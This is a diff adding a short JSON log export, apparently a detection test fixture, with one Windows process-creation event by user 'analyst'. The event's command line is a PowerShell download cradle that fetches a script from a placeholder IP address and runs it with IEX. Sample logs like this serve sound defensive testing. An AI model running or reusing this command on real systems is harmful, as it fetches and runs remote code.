@@ -1,0 +1,20 @@
+{
+  "exported_at": "2026-11-20T08:00:00Z",
+  "retained_fields": [
+    "process.command_line",
+    "user.name"
+  ],
+  "events": [
+    {
+      "timestamp": "2026-11-19T03:05:00Z",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "data": {
+        "process.command_line": "powershell.exe -NoP -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/p.ps1')\"",
+        "user.name": "analyst"
+      }
+    }
+  ]
+}
